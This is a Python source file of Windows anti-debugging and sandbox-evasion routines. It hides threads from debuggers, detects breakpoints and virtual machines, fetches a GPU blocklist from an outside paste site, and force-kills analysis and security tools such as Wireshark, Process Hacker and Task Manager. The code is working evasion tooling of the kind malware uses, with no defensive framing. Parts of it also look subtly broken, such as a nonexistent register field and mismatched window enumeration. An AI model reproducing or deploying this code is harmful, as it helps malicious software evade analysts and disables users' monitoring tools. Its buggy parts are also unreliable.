import ctypes
import subprocess
import os
import json
import requests
import psutil

class CONTEXT(ctypes.Structure):
    _fields_ = [
        ("ContextFlags", ctypes.c_ulong),
        ("Dr0", ctypes.c_ulong),
        ("Dr1", ctypes.c_ulong),
        ("Dr2", ctypes.c_ulong),
        ("Dr3", ctypes.c_ulong),
        ("Dr6", ctypes.c_ulong),
        ("Dr7", ctypes.c_ulong),
    ]


# Import necessary Windows API functions
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
ntdll = ctypes.windll.ntdll

# Define necessary Windows API structures and constants
THREAD_HIDE_FROM_DEBUGGER = 0x11
CONTEXT_DEBUG_REGISTERS = 0x10000 | 0x10
handleFlagProtectFromClose = 0x00000002

# Define necessary Windows API functions
NtSetInformationThread = ntdll.NtSetInformationThread
NtSetInformationThread.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong]

NtClose = ntdll.NtClose
NtClose.argtypes = [ctypes.c_void_p]

CreateMutex = kernel32.CreateMutexA
CreateMutex.argtypes = [ctypes.c_void_p, ctypes.c_bool, ctypes.c_char_p]

SetHandleInformation = kernel32.SetHandleInformation
SetHandleInformation.argtypes = [ctypes.c_void_p, ctypes.c_uint, ctypes.c_uint]

GetTickCount64 = kernel32.GetTickCount64
GetTickCount64.restype = ctypes.c_ulonglong

# Define functions to hide thread from debugger
def hide_thread_from_debugger():
    h_thread = ctypes.windll.kernel32.GetCurrentThread()
    NtSetInformationThread(h_thread, THREAD_HIDE_FROM_DEBUGGER, None, 0)

def nt_close_anti_debug_invalid_handle():
    status = NtClose(0x1231222)
    return status != 0

def nt_close_anti_debug_protected_handle():
    mutex_name = b"1234567"
    h_mutex = CreateMutex(None, False, mutex_name)
    SetHandleInformation(h_mutex, handleFlagProtectFromClose, handleFlagProtectFromClose)
    status = NtClose(h_mutex)
    return status != 0

def hardware_registers_breakpoints_detection():
    context = CONTEXT()
    context.ContextFlags = CONTEXT_DEBUG_REGISTERS
    success = ctypes.windll.kernel32.GetThreadContext(ctypes.windll.kernel32.GetCurrentThread(), ctypes.byref(context))
    if success != 0:
        if context.Dr1 != 0 or context.Dr2 != 0 or context.Dr3 != 0 or context.Dr7 != 0:
            return True
        dr_values = ctypes.cast(context.R8, ctypes.POINTER(ctypes.c_ulong * 2)).contents
        if dr_values[0] != 0 or dr_values[1] != 0:
            return True
    return False

def output_debug_string_anti_debug():
    ctypes.windll.kernel32.OutputDebugStringA(b"hm")
    last_error = ctypes.windll.kernel32.GetLastError()
    return last_error == 0

def ollydbg_exploit(text):
    ctypes.windll.kernel32.OutputDebugStringA(text.encode("utf-8"))

def check_sys_req():
    system_info = os.cpu_count()
    if system_info < 2:
        return False
    
    total_phys_memory = psutil.virtual_memory().total
    ram_mb = total_phys_memory // (1024 * 1024)
    if ram_mb < 2048:
        return False
    
    disk_info = psutil.disk_usage("/")
    disk_size_gb = disk_info.total // (1024 * 1024 * 1024)
    if disk_size_gb < 100:
        return False
    
    return True

def get_gpu_name():
    response = requests.get("https://rentry.co/povewdm6/raw")
    gpu_info = response.text.splitlines()
    gpu_name = subprocess.check_output("wmic path win32_videocontroller get name", shell=True).decode("utf-8").strip().split("\n")[1]
    return any(gpu_name in gpu_line for gpu_line in gpu_info)

def check_blacklisted_processes():
    blacklisted_processes = ["cmd.exe", "taskmgr.exe", "process.exe", "processhacker.exe", "ksdumper.exe", "fiddler.exe", "httpdebuggerui.exe", "wireshark.exe", "httpanalyzerv7.exe", "fiddler.exe", "decoder.exe", "regedit.exe", "procexp.exe", "dnspy.exe", "vboxservice.exe", "burpsuit.exe", "DbgX.Shell.exe", "ILSpy.exe"]
    for process_name in blacklisted_processes:
        subprocess.run(["taskkill", "/F", "/IM", process_name], capture_output=True, text=True)

def check_blacklisted_windows():
    blacklisted_window_names = ["proxifier", "graywolf", "extremedumper", "zed", "exeinfope", "dnspy", "titanHide", "ilspy", "titanhide", "x32dbg", "codecracker", "simpleassembly", "process hacker 2", "pc-ret", "http debugger", "Centos", "process monitor", "debug", "ILSpy", "reverse", "simpleassemblyexplorer", "process", "de4dotmodded", "dojandqwklndoqwd-x86", "sharpod", "folderchangesview", "fiddler", "die", "pizza", "crack", "strongod", "ida -", "brute", "dump", "StringDecryptor", "wireshark", "debugger", "httpdebugger", "gdb", "kdb", "x64_dbg", "windbg", "x64netdumper", "petools", "scyllahide", "megadumper", "reversal", "ksdumper v1.1 - by equifox", "dbgclr", "HxD", "monitor", "peek", "ollydbg", "ksdumper", "http", "wpe pro", "dbg", "httpanalyzer", "httpdebug", "PhantOm", "kgdb", "james", "x32_dbg", "proxy", "phantom", "mdbg", "WPE PRO", "system explorer", "de4dot", "X64NetDumper", "protection_id", "charles", "systemexplorer", "pepper", "hxd", "procmon64", "MegaDumper", "ghidra", "xd", "0harmony", "dojandqwklndoqwd", "hacker", "process hacker", "SAE", "mdb", "checker", "harmony", "Protection_ID", "PETools", "scyllaHide", "x96dbg", "systemexplorerservice", "folder", "mitmproxy", "dbx", "sniffer", "Process Hacker"]
    for hwnd, window_name in enumerate_windows():
        if any(window_name.lower().startswith(name) for name in blacklisted_window_names):
            subprocess.run(["taskkill", "/F", "/T", "/PID", str(hwnd)], capture_output=True, text=True)

def enumerate_windows():
    def callback(hwnd, window_names):
        window_text = ctypes.create_string_buffer(255)
        user32.GetWindowTextA(hwnd, window_text, 255)
        window_names.append(window_text.value.decode("utf-8"))
        return True

    window_names = []
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    enum_windows_proc = EnumWindowsProc(callback)
    user32.EnumWindows(enum_windows_proc, ctypes.byref(window_names))
    return window_names

def main():
    while True:
        hide_thread_from_debugger()

        if hardware_registers_breakpoints_detection():
            os._exit(1)

        if nt_close_anti_debug_invalid_handle():
            os._exit(1)

        if nt_close_anti_debug_protected_handle():
            os._exit(1)

        flag = ctypes.c_bool()
        kernel32.IsDebuggerPresent(ctypes.byref(flag))
        if flag.value:
            os._exit(-1)

        is_remote_debug_present = ctypes.c_bool()
        kernel32.CheckRemoteDebuggerPresent(-1, ctypes.byref(is_remote_debug_present))
        if is_remote_debug_present.value:
            os._exit(-1)

        if get_gpu_name():
            os._exit(-1)

        check_blacklisted_processes()

        if check_sys_req():
            print("Passed")
        else:
            os._exit(-1)

        if psutil.Process().cpu_percent(interval=1) < 50:
            return

        check_blacklisted_windows()

if __name__ == "__main__":
    main()
